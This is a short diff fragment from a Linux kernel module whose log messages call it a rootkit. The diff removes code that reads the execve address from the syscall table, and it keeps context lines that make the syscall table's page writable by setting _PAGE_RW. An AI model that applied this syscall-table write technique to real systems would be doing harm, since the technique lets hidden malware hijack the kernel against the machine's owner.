@@ -143,9 +143,6 @@ static int __init my_init(void)
 	pte = lookup_address((long unsigned int)syscall_table, &level);
 	pr_info("ROOTKIT PTE address located %p\n", &pte);
 	
-	execve_addr = (void *)syscall_table[__NR_execve]; 
-	pr_info("ROOTKIT execve is at %p\n", execve_addr);
-	
 	if (syscall_table != NULL) {
 		pte->pte |= _PAGE_RW;
 		
